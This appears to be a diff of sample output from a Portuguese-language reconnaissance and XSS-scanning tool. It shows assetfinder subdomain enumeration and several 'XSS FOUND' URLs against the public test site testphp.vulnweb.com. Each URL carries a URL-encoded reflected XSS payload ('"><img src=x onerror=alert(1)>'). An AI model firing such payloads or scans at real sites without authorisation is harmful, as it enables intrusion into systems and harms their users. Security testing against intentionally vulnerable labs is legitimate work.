@@ -21,7 +21,9 @@ _    _  _____  _____ _______ _____ _    _
 
                                            
 
-Executando: Executando assetfinder
+Executando: 
+
+Executando assetfinder
 Comando: assetfinder -subs-only testphp.vulnweb.com | anew subdomains.txt
 Saída: 
 Executando assetfinder concluído com sucesso.
@@ -48,7 +50,11 @@ endpoint.txt  host.txt  possible_xss.txt  resultado.txt  subdomains.txt  xss_fuz
 #cat resultado.txt
 
 XSS FOUND: http://testphp.vulnweb.com/showimage.php?file=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22
- XSS FOUND: http://testphp.vulnweb.com:80/hpp/index.php?pp=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22
- XSS FOUND: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22&p=%22>
- XSS FOUND: http://testphp.vulnweb.com/hpp/params.php?p=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22
- XSS FOUND: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22&p=%22>
+
+XSS FOUND: http://testphp.vulnweb.com:80/hpp/index.php?pp=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22
+
+XSS FOUND: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22&p=%22>
+
+XSS FOUND: http://testphp.vulnweb.com/hpp/params.php?p=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22
+
+XSS FOUND: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22&p=%22>
